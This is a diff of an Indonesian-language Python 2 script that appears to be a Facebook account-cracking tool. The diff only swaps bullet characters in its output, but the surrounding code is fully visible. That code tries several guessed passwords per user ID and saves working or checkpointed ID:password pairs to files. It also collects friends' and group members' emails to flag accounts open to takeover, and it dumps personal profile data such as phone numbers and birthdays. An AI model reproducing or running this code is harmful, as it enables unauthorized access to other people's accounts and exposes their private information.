@@ -323,15 +323,15 @@ def pilih_super():
 			if 'access_token' in q:
 				print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
 				print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
-				print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
-				print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
+				print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
+				print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass1 + '\n'
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
 					print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
 					print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
-					print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
-					print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
+					print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
+					print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass1 + '\n'
 					cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 					cek.write("ID:" +user+ " Pw:" +pass1+"\n")
 					cek.close()
@@ -343,15 +343,15 @@ def pilih_super():
 					if 'access_token' in q:
 						print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
 						print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
-						print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
-						print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
+						print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
+						print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass2 + '\n'
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in q["error_msg"]:
 							print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
 							print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
-							print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
-							print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
+							print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
+							print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass2 + '\n'
 							cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 							cek.write("ID:" +user+ " Pw:" +pass2+"\n")
 							cek.close()
@@ -363,15 +363,15 @@ def pilih_super():
 							if 'access_token' in q:
 								print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
 								print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
-								print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
-								print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
+								print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
+								print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass3 + '\n'
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in q["error_msg"]:
 									print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
 									print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
-									print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
-									print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
+									print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
+									print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass3 + '\n'
 									cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 									cek.write("ID:" +user+ " Pw:" +pass3+"\n")
 									cek.close()
@@ -383,15 +383,15 @@ def pilih_super():
 									if 'access_token' in q:
 										print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
 										print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
-										print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
-										print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
+										print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
+										print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass4 + '\n'
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in q["error_msg"]:
 											print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
 											print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
-											print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
-											print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
+											print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
+											print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass4 + '\n'
 											cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 											cek.write("ID:" +user+ " Pw:" +pass4+"\n")
 											cek.close()
@@ -404,15 +404,15 @@ def pilih_super():
 											if 'access_token' in q:
 												print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
 												print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
-												print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
-												print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
+												print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
+												print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass5 + '\n'
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in q["error_msg"]:
 													print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
 													print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
-													print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
-													print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
+													print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
+													print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass5 + '\n'
 													cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 													cek.write("ID:" +user+ " Pw:" +pass5+"\n")
 													cek.close()
@@ -424,15 +424,15 @@ def pilih_super():
 													if 'access_token' in q:
 														print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
 														print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
-														print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
-														print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
+														print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
+														print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass6 + '\n'
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in q["error_msg"]:
 															print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
 															print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
-															print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
-															print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
+															print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
+															print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass6 + '\n'
 															cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 															cek.write("ID:" +user+ " Pw:" +pass6+"\n")
 															cek.close()
@@ -444,15 +444,15 @@ def pilih_super():
 										         			        if 'access_token' in q:
 														                print '\x1b[1;96m[✓] \x1b[1;92mBERHASIL'
 														                print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;92m' + b['name']
-														                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
-														                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass7 + '\n'
+														                print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;92m' + user
+														                print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;92m' + pass7 + '\n'
 														                oks.append(user+pass7)
 													                else:
 														                if 'www.facebook.com' in q["error_msg"]:
 															                print '\x1b[1;96m[✖] \x1b[1;93mCEKPOINT'
 															                print '\x1b[1;96m[✺] \x1b[1;97mNama \x1b[1;91m    : \x1b[1;93m' + b['name']
-															                print '\x1b[1;96m[➹] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
-															                print '\x1b[1;96m[➹] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass7 + '\n'
+															                print '\x1b[1;96m[☆] \x1b[1;97mID \x1b[1;91m      : \x1b[1;93m' + user
+															                print '\x1b[1;96m[☆] \x1b[1;97mPassword \x1b[1;91m: \x1b[1;93m' + pass7 + '\n'
 															                cek = open("out/Author sangat suka cwek yg namanya ALIFAH & kawan kawan _Tapi sayang cintanya Bertepuk seblah tangan __Tapi boong wkwkw Salam Kiddie hkhkhk.txt", "a")
 															                cek.write("ID:" +user+ " Pw:" +pass7+"\n")
 															                cek.close()
@@ -496,8 +496,8 @@ def grupsaya():
 			listgrup.append(id)
 			f.write(id + '\n')
 			print("\033[1;96m[✓] \033[1;92mGROUP SAYA")
-			print("\033[1;96m[➹] \033[1;97mID  \033[1;91m: \033[1;92m"+str(id))
-			print("\033[1;96m[➹] \033[1;97mNama\033[1;91m: \033[1;92m"+str(nama) + '\n')
+			print("\033[1;96m[☆] \033[1;97mID  \033[1;91m: \033[1;92m"+str(id))
+			print("\033[1;96m[☆] \033[1;97mNama\033[1;91m: \033[1;92m"+str(nama) + '\n')
 		print 42*"\033[1;96m="
 		print"\033[1;96m[+] \033[1;92mTotal Group \033[1;91m:\033[1;97m %s"%(len(listgrup))
 		print("\033[1;96m[+] \033[1;92mTersimpan \033[1;91m: \033[1;97mout/Grupid.txt")
@@ -543,25 +543,25 @@ def informasi():
 			z = json.loads(x.text)
 			print 43*"\033[1;96m="
 			try:
-				print '\033[1;96m[➹] \033[1;93mNama\033[1;97m          : '+z['name']
+				print '\033[1;96m[☆] \033[1;93mNama\033[1;97m          : '+z['name']
 			except KeyError: print '\033[1;96m[?] \033[1;93mNama\033[1;97m          : \033[1;91mTidak ada'
 			try:
-				print '\033[1;96m[➹] \033[1;93mID\033[1;97m            : '+z['id']
+				print '\033[1;96m[☆] \033[1;93mID\033[1;97m            : '+z['id']
 			except KeyError: print '\033[1;96m[?] \033[1;93mID\033[1;97m            : \033[1;91mTidak ada'
 			try:
-				print '\033[1;96m[➹] \033[1;93mEmail\033[1;97m         : '+z['email']
+				print '\033[1;96m[☆] \033[1;93mEmail\033[1;97m         : '+z['email']
 			except KeyError: print '\033[1;96m[?] \033[1;93mEmail\033[1;97m         : \033[1;91mTidak ada'
 			try:
-				print '\033[1;96m[➹] \033[1;93mNo HP\033[1;97m         : '+z['mobile_phone']
+				print '\033[1;96m[☆] \033[1;93mNo HP\033[1;97m         : '+z['mobile_phone']
 			except KeyError: print '\033[1;96m[?] \033[1;93mNo HP\033[1;97m         : \033[1;91mTidak ada'
 			try:
-				print '\033[1;96m[➹] \033[1;93mTempat tinggal\033[1;97m: '+z['location']['name']
+				print '\033[1;96m[☆] \033[1;93mTempat tinggal\033[1;97m: '+z['location']['name']
 			except KeyError: print '\033[1;96m[?] \033[1;93mTempat tinggal\033[1;97m: \033[1;91mTidak ada'
 			try:
-				print '\033[1;96m[➹] \033[1;93mTanggal lahir\033[1;97m : '+z['birthday']
+				print '\033[1;96m[☆] \033[1;93mTanggal lahir\033[1;97m : '+z['birthday']
 			except KeyError: print '\033[1;96m[?] \033[1;93mTanggal lahir\033[1;97m : \033[1;91mTidak ada'
 			try:
-				print '\033[1;96m[➹] \033[1;93mSekolah\033[1;97m       : '
+				print '\033[1;96m[☆] \033[1;93mSekolah\033[1;97m       : '
 				for q in z['education']:
 					try:
 						print '\033[1;91m                   ~ \033[1;97m'+q['school']['name']
@@ -663,9 +663,9 @@ def clone_dari_daftar_teman():
 					continue
 				if '"messages.ERROR_INVALID_USERNAME">' in pek:
 					print("\033[1;96m[✓] \033[1;92mVULN")
-					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
-					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
-					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama+ '\n')
+					print("\033[1;96m[☆] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
+					print("\033[1;96m[☆] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
+					print("\033[1;96m[☆] \033[1;97mNama \033[1;91m: \033[1;92m"+nama+ '\n')
 					save = open('out/MailVuln.txt','a')
 					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
 					save.close()
@@ -738,9 +738,9 @@ def clone_dari_teman():
 					continue
 				if '"messages.ERROR_INVALID_USERNAME">' in pek:
 					print("\033[1;96m[✓] \033[1;92mVULN")
-					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
-					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
-					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
+					print("\033[1;96m[☆] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
+					print("\033[1;96m[☆] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
+					print("\033[1;96m[☆] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
 					save = open('out/TemanMailVuln.txt','a')
 					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
 					save.close()
@@ -812,9 +812,9 @@ def clone_dari_member_group():
 					continue
 				if '"messages.ERROR_INVALID_USERNAME">' in pek:
 					print("\033[1;96m[✓] \033[1;92mVULN")
-					print("\033[1;96m[➹] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
-					print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
-					print("\033[1;96m[➹] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
+					print("\033[1;96m[☆] \033[1;97mID   \033[1;91m: \033[1;92m"+id)
+					print("\033[1;96m[☆] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
+					print("\033[1;96m[☆] \033[1;97mNama \033[1;91m: \033[1;92m"+nama)
 					save = open('out/GrupMailVuln.txt','a')
 					save.write("Nama : "+ nama + '\n' "ID        : "+ id + '\n' "Email  : "+ mail + '\n\n')
 					save.close()
@@ -879,7 +879,7 @@ def clone_dari_file():
 				continue
 			if '"messages.ERROR_INVALID_USERNAME">' in pek:
 				print("\033[1;96m[✓] \033[1;92mVULN")
-				print("\033[1;96m[➹] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
+				print("\033[1;96m[☆] \033[1;97mEmail\033[1;91m: \033[1;92m"+mail)
 				save = open('out/MailVuln.txt','a')
 				save.write("Email: "+ mail + '\n\n')
 				save.close()
